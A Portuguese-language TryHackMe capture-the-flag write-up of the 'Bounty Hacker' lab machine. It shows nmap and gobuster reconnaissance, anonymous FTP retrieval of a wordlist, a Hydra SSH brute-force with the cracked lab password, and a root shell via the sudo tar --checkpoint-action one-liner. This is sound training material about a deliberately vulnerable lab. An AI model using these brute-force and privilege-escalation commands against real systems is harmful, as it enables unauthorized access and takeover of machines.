---
share: true
title: Bounty Hacker - TryHackMe
date: 2026-05-24
categories:
  - writeup
  - tryhackme
  - ctf
  - linux
description: FTP anônimo expõe wordlist → brute-force SSH → sudo tar para escalar para root.
image: Images/bountyhacker.png
tags:
  - writeup
  - tryhackme
  - ctf
  - linux
  - ftp
  - bruteforce
  - privilege-escalation
  - tar
platform: TryHackMe
dificuldade: Fácil
data: 2026-05-24
status: concluído
---

> [!quote] Descrição
> You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

---

## Visão Geral

| Campo       | Detalhe                                 |
| ----------- | --------------------------------------- |
| Plataforma  | TryHackMe                               |
| Dificuldade | Fácil                                   |
| IP alvo     | `10.67.159.47`                          |
| SO          | Ubuntu 20.04.6 LTS                      |
| Vetor       | FTP anônimo → brute-force SSH → sudo tar |

Superfície de ataque: FTP com login anônimo expõe wordlist e username. Hydra quebra a senha SSH. Escalada via `tar` com permissão `sudo`.

---

## 1 — Reconhecimento

### 1.1 Port Scan

```
nmap -sC -sV -p- --min-rate 5000 -oN nmap/initial 10.67.159.47
```

| Flag            | Função                                                              |
| --------------- | ------------------------------------------------------------------- |
| `-sC`           | Scripts padrão (`--script=default`): detecta serviços, tenta auth anônima em FTP, enumera SMB etc. |
| `-sV`           | Detecta versões dos serviços                                        |
| `-p-`           | Varre todas as 65535 portas                                         |
| `--min-rate 5000` | Força mínimo de 5000 pacotes/s (adequado para CTF)               |
| `-oN`           | Salva output em formato legível                                     |

Output:

```
Nmap scan report for 10.67.159.47
Host is up (0.21s latency).
Not shown: 57482 filtered tcp ports (no-response), 8050 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.224.89
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 12:5d:37:e7:f1:1f:e5:27:7d:88:d2:06:f9:04:b2:7d (RSA)
|   256 fa:cc:f5:1f:8a:69:74:db:fb:0f:38:48:62:1d:f5:a6 (ECDSA)
|_  256 28:be:29:c6:fb:a5:ea:b9:30:3d:be:9b:86:f8:b2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Três serviços expostos: **FTP** (21), **SSH** (22) e **HTTP** (80).

### 1.2 Enumeração Web

A página HTTP exibe uma provocação da personagem Jet:

![[bountyhacker.png|bountyhacker.png]]

> [!quote] Jet
> "Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."

Enumeração de diretórios com Gobuster não revelou vetores adicionais:

```
gobuster dir -u 10.67.159.47 -w ../../Utilities/Wordlists/directory-list-2.3-medium.txt

===============================================================
images               (Status: 301) [--> http://10.67.159.47/images/]
javascript           (Status: 301) [--> http://10.67.159.47/javascript/]
server-status        (Status: 403)
===============================================================
```

### 1.3 Exploração do FTP

**FTP** (RFC 959) utiliza duas conexões: porta **21** para controle (comandos e respostas) e uma porta dinâmica para transferência de dados.

Dois modos de conexão:

| Modo            | Funcionamento                                                                  | Problema                                     |
| --------------- | ------------------------------------------------------------------------------ | -------------------------------------------- |
| **Ativo (PORT)**  | Servidor inicia a conexão de dados da porta 20 para o cliente                | Firewall/NAT do cliente bloqueia conexões entrantes |
| **Passivo (PASV)** | Cliente solicita PASV; servidor abre porta alta; cliente conecta nela        | Mais amigável a firewall                     |

> [!info] Observação
> O servidor rejeita PASV (`550 Permission denied`), portanto a conexão deve ser feita em modo ativo (`ftp -A`).

```
ftp -A 10.67.159.47

Connected to 10.67.159.47.
220 (vsFTPd 3.0.5)
Name (10.67.159.47:roger): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

Dois arquivos recuperados:

- **`locks.txt`** — lista de strings (wordlist de senhas)
- **`task.txt`** — notas internas que revelam o username `lin`:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

> [!success] Achado
> Username **`lin`** identificado implicitamente na assinatura do arquivo `task.txt`.

---

## 2 — Exploração

### 2.1 Brute-force SSH com Hydra

Com o username `lin` e a wordlist `locks.txt`, executa-se ataque de dicionário sobre o SSH:

```
hydra -l lin -P ftp/locks.txt ssh://10.67.159.47

[DATA] attacking ssh://10.67.159.47:22/
[22][ssh] host: 10.67.159.47   login: lin   password: RedDr4gonSynd1cat3

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-24 18:14:13
```

> [!success] Credenciais obtidas
> `lin` : `RedDr4gonSynd1cat3`

### 2.2 Acesso SSH

```
ssh lin@10.67.159.47

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

lin@ip-10-67-159-47:~/Desktop$ whoami
lin
lin@ip-10-67-159-47:~/Desktop$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

---

## 3 — Escalada de Privilégios

### 3.1 Enumeração local

```
lin@ip-10-67-159-47:~/Desktop$ sudo -l

Matching Defaults entries for lin on ip-10-67-159-47:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User lin may run the following commands on ip-10-67-159-47:
    (root) /bin/tar
```

> [!warning] Vetor identificado
> O usuário `lin` pode executar `/bin/tar` como `root` sem senha. Qualquer binário com permissão `sudo` irrestrita é candidato a privesc via GTFOBins.

### 3.2 Exploit via GTFOBins — `tar`

Referência: https://gtfobins.github.io/gtfobins/tar/#sudo

O `tar` permite execução de comandos arbitrários via `--checkpoint-action`. Como é executado como root, o shell resultante herda os privilégios:

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Flags

| Flag       | Hash |
| :--------: | :--: |
| `user.txt` |      |
| `root.txt` |      |

---

## Conclusão

A máquina expõe login FTP anônimo que entrega uma wordlist (`locks.txt`) e um username (`lin`) via `task.txt`. O ataque de dicionário com Hydra quebra a senha SSH. Após o acesso inicial, `sudo -l` revela que `tar` pode ser executado como root — o GTFOBins documenta o vetor `--checkpoint-action=exec` que spawna um shell root. Cadeia completa: FTP anon → user discovery → SSH brute-force → sudo tar → root.

---

## Referências

- LYON, Gordon. **Nmap: Network Mapper**. Disponível em: https://nmap.org. Acesso em: 24 mai. 2026.
- VAN HAUSER; ATROX. **THC-Hydra: Fast and flexible online password cracking tool**. Disponível em: https://github.com/vanhauser-thc/thc-hydra. Acesso em: 24 mai. 2026.
- REEVES, OJ. **Gobuster: Directory/File, DNS and VHost busting tool**. Disponível em: https://github.com/OJ/gobuster. Acesso em: 24 mai. 2026.
- GTFOBINS CONTRIBUTORS. **GTFOBins: Unix binaries that can be used to bypass local security restrictions**. Disponível em: https://gtfobins.github.io. Acesso em: 24 mai. 2026.
- POSTEL, Jon; REYNOLDS, Joyce. **RFC 959: File Transfer Protocol (FTP)**. IETF, out. 1985. Disponível em: https://www.rfc-editor.org/rfc/rfc959. Acesso em: 24 mai. 2026.
